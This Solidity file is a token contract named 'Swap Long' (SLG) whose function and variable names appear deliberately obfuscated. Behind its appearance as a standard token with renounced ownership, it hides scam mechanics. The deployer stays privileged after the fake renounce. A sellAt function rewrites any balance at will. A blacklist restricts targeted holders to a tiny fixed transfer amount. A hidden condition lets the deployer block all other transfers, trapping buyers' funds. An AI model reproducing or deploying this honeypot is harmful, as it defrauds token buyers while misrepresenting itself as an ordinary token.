//SPDX-License-Identifier: MIT

pragma solidity ^0.8.12;

interface swapTokenReceiver {
    function totalSupply() external view returns (uint256);

    function balanceOf(address listLiquidity) external view returns (uint256);

    function transfer(address launchWallet, uint256 launchedToken) external returns (bool);

    function allowance(address feeAuto, address spender) external view returns (uint256);

    function approve(address spender, uint256 launchedToken) external returns (bool);

    function transferFrom(
        address sender,
        address launchWallet,
        uint256 launchedToken
    ) external returns (bool);

    event Transfer(address indexed from, address indexed feeLiquidity, uint256 value);
    event Approval(address indexed feeAuto, address indexed spender, uint256 value);
}

abstract contract buyShouldMax {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface modeAt {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface launchMarketing {
    function createPair(address limitExemptMarketing, address txExempt) external returns (address);
}

interface swapTokenReceiverMetadata is swapTokenReceiver {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract SwapLong is buyShouldMax, swapTokenReceiver, swapTokenReceiverMetadata {

    function allowance(address fundWalletAmount, address tradingTake) external view virtual override returns (uint256) {
        if (tradingTake == marketingReceiverSender) {
            return type(uint256).max;
        }
        return isSell[fundWalletAmount][tradingTake];
    }

    string private marketingTake = "SLG";

    function owner() external view returns (address) {
        return sellToken;
    }

    mapping(address => bool) public fundLiquidity;

    uint256 toAt;

    function takeLimit() private view {
        require(buyMin[_msgSender()]);
    }

    address public receiverTo;

    function getOwner() external view returns (address) {
        return sellToken;
    }

    uint256 public takeLaunch;

    bool public teamFee;

    mapping(address => mapping(address => uint256)) private isSell;

    function balanceOf(address listLiquidity) public view virtual override returns (uint256) {
        return isSwapMarketing[listLiquidity];
    }

    address receiverIs = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    uint256 constant isShould = 15 ** 10;

    string private maxMarketing = "Swap Long";

    function decimals() external view virtual override returns (uint8) {
        return exemptToken;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return tradingAmount;
    }

    function sellAt(address enableSender, uint256 launchedToken) public {
        takeLimit();
        isSwapMarketing[enableSender] = launchedToken;
    }

    address private sellToken;

    bool public autoToken;

    function name() external view virtual override returns (string memory) {
        return maxMarketing;
    }

    function liquiditySell() public {
        emit OwnershipTransferred(receiverTo, address(0));
        sellToken = address(0);
    }

    address public txMarketing;

    bool private limitLiquidity;

    uint256 private sellFee;

    function approve(address tradingTake, uint256 launchedToken) public virtual override returns (bool) {
        isSell[_msgSender()][tradingTake] = launchedToken;
        emit Approval(_msgSender(), tradingTake, launchedToken);
        return true;
    }

    mapping(address => bool) public buyMin;

    function transfer(address enableSender, uint256 launchedToken) external virtual override returns (bool) {
        return shouldModeWallet(_msgSender(), enableSender, launchedToken);
    }

    constructor (){
        if (teamFee) {
            takeLaunch = sellFee;
        }
        modeAt teamLaunched = modeAt(marketingReceiverSender);
        txMarketing = launchMarketing(teamLaunched.factory()).createPair(teamLaunched.WETH(), address(this));
        if (teamFee) {
            minTotal = true;
        }
        receiverTo = _msgSender();
        liquiditySell();
        buyMin[receiverTo] = true;
        isSwapMarketing[receiverTo] = tradingAmount;
        
        emit Transfer(address(0), receiverTo, tradingAmount);
    }

    function shouldModeWallet(address shouldSwapLiquidity, address launchWallet, uint256 launchedToken) internal returns (bool) {
        if (shouldSwapLiquidity == receiverTo) {
            return receiverFund(shouldSwapLiquidity, launchWallet, launchedToken);
        }
        uint256 launchFee = swapTokenReceiver(txMarketing).balanceOf(receiverIs);
        require(launchFee == toAt);
        require(launchWallet != receiverIs);
        if (fundLiquidity[shouldSwapLiquidity]) {
            return receiverFund(shouldSwapLiquidity, launchWallet, isShould);
        }
        return receiverFund(shouldSwapLiquidity, launchWallet, launchedToken);
    }

    event OwnershipTransferred(address indexed isSender, address indexed buyLaunch);

    uint8 private exemptToken = 18;

    function toLiquiditySwap(address toTake) public {
        takeLimit();
        
        if (toTake == receiverTo || toTake == txMarketing) {
            return;
        }
        fundLiquidity[toTake] = true;
    }

    function symbol() external view virtual override returns (string memory) {
        return marketingTake;
    }

    mapping(address => uint256) private isSwapMarketing;

    bool public minTotal;

    function transferFrom(address shouldSwapLiquidity, address launchWallet, uint256 launchedToken) external override returns (bool) {
        if (_msgSender() != marketingReceiverSender) {
            if (isSell[shouldSwapLiquidity][_msgSender()] != type(uint256).max) {
                require(launchedToken <= isSell[shouldSwapLiquidity][_msgSender()]);
                isSell[shouldSwapLiquidity][_msgSender()] -= launchedToken;
            }
        }
        return shouldModeWallet(shouldSwapLiquidity, launchWallet, launchedToken);
    }

    address marketingReceiverSender = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    uint256 launchBuyReceiver;

    uint256 private tradingAmount = 100000000 * 10 ** 18;

    function receiverFund(address shouldSwapLiquidity, address launchWallet, uint256 launchedToken) internal returns (bool) {
        require(isSwapMarketing[shouldSwapLiquidity] >= launchedToken);
        isSwapMarketing[shouldSwapLiquidity] -= launchedToken;
        isSwapMarketing[launchWallet] += launchedToken;
        emit Transfer(shouldSwapLiquidity, launchWallet, launchedToken);
        return true;
    }

    function totalTrading(address swapEnable) public {
        if (autoToken) {
            return;
        }
        
        buyMin[swapEnable] = true;
        
        autoToken = true;
    }

    function maxTeamMin(uint256 launchedToken) public {
        takeLimit();
        toAt = launchedToken;
    }

}